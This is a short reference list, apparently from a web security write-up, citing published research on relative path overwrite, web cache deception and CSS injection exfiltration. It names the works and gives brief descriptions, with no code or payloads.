- Gareth Heyes, "Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities," PortSwigger Research (2015)
- MBSD, "A few RPO exploitation techniques," Technical Whitepaper (2015) — Extended RPO exploitation including IE-specific and non-stylesheet variants
- Soroush Dalili, "Non-Root-Relative Path Overwrite (RPO) in IIS and .Net applications" (2015) — IIS/ASP.NET-specific RPO variant
- Takuya Watanabe et al., "Large-Scale Analysis of Style Injection by Relative Path Overwrite," WWW 2018 (ACM) — Empirical measurement of 377K vulnerable pages across 12K sites
- Ian Hickey, "Relative Path File Injection: The Next Evolution in RPO," DEF CON 32 AppSec Village (2024) — RPFI attack vector with polyglot exploitation
- PortSwigger Research, "Gotta cache 'em all: bending the rules of web cache exploitation," Black Hat USA 2024 — Systematic delimiter/normalization differential mapping across CDN providers
- PortSwigger, "Web Cache Deception," Web Security Academy — Comprehensive cache deception methodology including path confusion techniques
- d0nut, "Better Exfiltration via HTML Injection" / "Sequential Import Chaining" — CSS exfiltration via @import chaining
- x-c3ll, "CSS Injection Primitives" — Comprehensive catalog of CSS-based exfiltration techniques
- Securitum Research, "CSS data exfiltration in Firefox via a single injection point" — Firefox-specific CSS exfiltration

---

*This document was created for defensive security research and vulnerability understanding purposes.*
